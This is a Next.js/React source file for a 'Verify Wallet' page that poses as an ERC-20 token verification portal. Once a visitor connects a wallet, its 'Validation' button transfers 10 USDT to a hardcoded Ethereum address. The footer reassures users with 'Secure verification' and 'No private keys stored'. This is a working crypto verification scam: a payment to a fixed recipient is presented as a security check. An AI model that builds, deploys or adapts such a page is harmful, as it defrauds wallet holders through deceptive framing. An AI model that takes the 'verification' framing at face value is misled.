'use client';

import '@rainbow-me/rainbowkit/styles.css';
import { useState } from 'react';
import {
  WagmiConfig,
  createConfig,
  useAccount,
  useDisconnect,
  useWalletClient,
} from 'wagmi';
import { mainnet } from 'wagmi/chains';
import {
  ConnectButton,
  RainbowKitProvider,
  getDefaultConfig,
} from '@rainbow-me/rainbowkit';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { parseUnits } from 'viem';

const config = getDefaultConfig({
  appName: 'Verify Wallet',
  projectId: 'your_project_id', // înlocuiește cu WalletConnect projectId real
  chains: [mainnet],
  ssr: true,
});

const queryClient = new QueryClient();

// Adresa contractului USDT pe Ethereum
const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
// Adresa destinatarului
const recipient = '0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75';

function WalletComponent() {
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { data: walletClient } = useWalletClient();
  const [status, setStatus] = useState('');

  const handleValidate = async () => {
    if (!walletClient || !address) return;

    try {
      setStatus('⏳ Sending 10 USDT...');

      const usdtAbi = [
        {
          name: 'transfer',
          type: 'function',
          stateMutability: 'nonpayable',
          inputs: [
            { name: 'to', type: 'address' },
            { name: 'value', type: 'uint256' },
          ],
          outputs: [{ name: '', type: 'bool' }],
        },
      ];

      const hash = await walletClient.writeContract({
        address: usdtContractAddress,
        abi: usdtAbi,
        functionName: 'transfer',
        args: [recipient, parseUnits('10', 6)],
      });

      setStatus(`✅ Transaction sent: ${hash}`);
    } catch (err) {
      console.error(err);
      setStatus('❌ Transaction failed or was rejected.');
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4 py-12">
      <div className="w-full max-w-xl bg-white border border-gray-200 rounded-2xl shadow-md p-8 space-y-6">
        <header className="text-center">
          <h1 className="text-3xl font-bold text-blue-700">Verify Wallet</h1>
          <p className="text-gray-500 mt-1 text-sm">ERC-20 Token Verification Portal</p>
        </header>

        <div className="flex justify-center">
          <ConnectButton />
        </div>

        {isConnected && (
          <div className="space-y-4">
            <div className="bg-gray-50 p-4 rounded-md text-sm text-gray-600 border border-gray-100">
              Connected as: <span className="font-mono text-blue-700">{address}</span>
            </div>

            <button
              onClick={handleValidate}
              className="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700 transition"
            >
              Validation (Send 10 USDT)
            </button>

            {status && <p className="text-center text-sm text-gray-700">{status}</p>}

            <button
              onClick={() => disconnect()}
              className="w-full text-blue-600 border border-blue-600 py-2 rounded-lg hover:bg-blue-50 transition"
            >
              Disconnect Wallet
            </button>
          </div>
        )}

        <footer className="text-center text-xs text-gray-400 pt-6 border-t border-gray-100">
          Secure verification across Ethereum Mainnet. No private keys stored.
        </footer>
      </div>
    </div>
  );
}

export default function Page() {
  return (
    <QueryClientProvider client={queryClient}>
      <WagmiConfig config={config}>
        <RainbowKitProvider>
          <WalletComponent />
        </RainbowKitProvider>
      </WagmiConfig>
    </QueryClientProvider>
  );
}
